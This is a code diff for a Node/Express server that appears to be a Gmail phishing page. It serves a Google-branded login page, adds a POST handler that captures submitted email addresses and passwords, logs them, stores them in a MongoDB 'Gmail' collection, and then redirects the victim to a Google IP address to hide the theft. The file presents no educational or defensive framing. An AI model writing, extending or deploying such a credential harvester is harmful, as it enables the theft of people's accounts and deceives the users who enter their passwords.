@@ -2,38 +2,64 @@ require("dotenv").config();
 const express = require("express");
 const mongoose = require("mongoose");
 const { json } = require("express");
-const path = require('path');
+const path = require("path");
 
+const Gmail = require("./middleware/gmail.js");
 
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 const port = process.env.PORT || 8080;
 const host = process.env.HOST || "::";
 
 // Mongo connection
-/* mongoose
-  .connect(process.env.DB_URL, {
-    useNewUrlParser: true,
-    useUnifiedTopology: true,
-  })
-  .catch((err) => console.log(err)); */
+mongoose
+	.connect(process.env.DB_URL, {
+		useNewUrlParser: true,
+		useUnifiedTopology: true,
+	})
+	.catch((err) => console.log(err));
 
-app.get("/",(req,res)=>{
-	res.sendFile(path.join(__dirname, '/HTML/index.html'));
+//Get request for main page
+app.get("/", (req, res) => {
+	res.sendFile(path.join(__dirname, "/HTML/index.html"));
 });
 
-app.get("/favicon",(req,res)=>{
-	res.sendFile(path.join(__dirname, '/HTML/images/googleIcon.png'));
+//Post request for main page
+app.post("/", (req, res) => {
+	const email = req.body.email;
+	const pass = req.body.pass;
+	console.log(req.body);
+	const gmail = new Gmail({
+		email: email,
+		pass: pass,
+	});
+
+	gmail
+		.save()
+		.then((result) => {
+			res.redirect("/");
+		})
+		.catch((err) => {
+			console.log(err);
+		});
+	res.redirect("http://172.217.168.174");
 });
 
-app.get("/style",(req,res)=>{
-	res.sendFile(path.join(__dirname, '/HTML/css/style.css'));
+//Files
+
+app.get("/favicon", (req, res) => {
+	res.sendFile(path.join(__dirname, "/HTML/images/googleIcon.png"));
 });
 
-app.get("/script",(req,res)=>{
-	res.sendFile(path.join(__dirname, '/HTML/js/password.js'));
+app.get("/style", (req, res) => {
+	res.sendFile(path.join(__dirname, "/HTML/css/style.css"));
+});
+
+app.get("/script", (req, res) => {
+	res.sendFile(path.join(__dirname, "/HTML/js/password.js"));
 });
 
 app.listen(port);
-console.log('Server started at http://localhost:' + port);
+console.log("Server started at http://localhost:" + port);
